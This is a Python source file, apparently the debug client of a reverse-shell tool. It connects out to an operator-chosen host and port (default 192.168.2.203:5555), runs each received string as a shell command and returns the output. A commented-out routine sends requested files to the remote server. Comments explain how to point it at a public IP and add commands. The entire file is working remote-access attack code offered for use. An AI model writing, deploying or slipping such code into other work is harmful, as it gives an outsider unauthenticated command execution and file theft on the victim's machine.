import os
import random
import socket
import string
import subprocess
import sys

# THIS IS A DEBUG VERSION USE CLIENT.PYW INSTEAD 

HOST = sys.argv[1] if len(sys.argv) > 1 else '192.168.2.203' # Change this to your public ip if you want to use it outside of your local network
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) # Change the port if you want to but make sure to change it in Client.py as well
print('Please wait while we establish a connection...')
s = socket.socket()
s.connect((HOST, PORT))
msg = s.recv(1024).decode()
print('[*] Server:', msg)

# Example for custom command, put your code in varName (you can change the name if you want)
# varName = print('test')
while True:
    cmd = s.recv(1024).decode()
    # print(f'[*] receive {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    # if cmd.lower() in ['down', 'download']:
    #     sep = '#SEP#'
    #     file = s.recv(1024).decode()
    #     file_size = os.path.getsize(file)
    #     if sep in file:
    #         print('Warning invalid filename')
    #         exit(-1)
    #     s.send(f'{file}{sep}{file_size}'.encode())
    #     with open(file, 'rb') as f:
    #         while True:
    #             file_bytes = f.read(1024)
    #             if not file_bytes:
    #                 break
    #             s.sendall(file_bytes)
    #         f.close()
        
    # To add your own command remove the # below and change alias with the command alias and command with the command name
    # Make sure to add it to RevShellServer.py as well
    # if cmd.lower() in ['alias', 'command']:
        # s.send(varName.encode())

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = 'OK'.encode()

    s.send(result)

s.close()
